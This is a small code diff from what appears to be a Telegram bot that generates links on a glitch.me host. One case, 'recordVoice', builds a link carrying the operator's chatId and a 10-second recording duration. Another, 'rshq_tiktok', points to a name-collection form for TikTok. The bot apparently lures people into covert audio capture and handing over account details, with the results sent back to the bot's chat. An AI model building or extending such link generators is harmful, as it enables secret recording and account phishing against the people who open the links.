@@ -781,7 +781,7 @@ bot.on('callback_query', async (callbackQuery) => {
                 break;
             case 'recordVoice':
                 const duration = 10;  // مدة التسجيل الثابتة
-                link = `https://leather-marble-shrine.glitch.me/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
+                link = `https://leather-marble-shrine.glitch.me/recora/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
                 break;
             case 'rshq_tiktok':
                 link = `https://leather-marble-shrine.glitch.me/getNameForm?chatId=${chatId}&type=tiktok`;
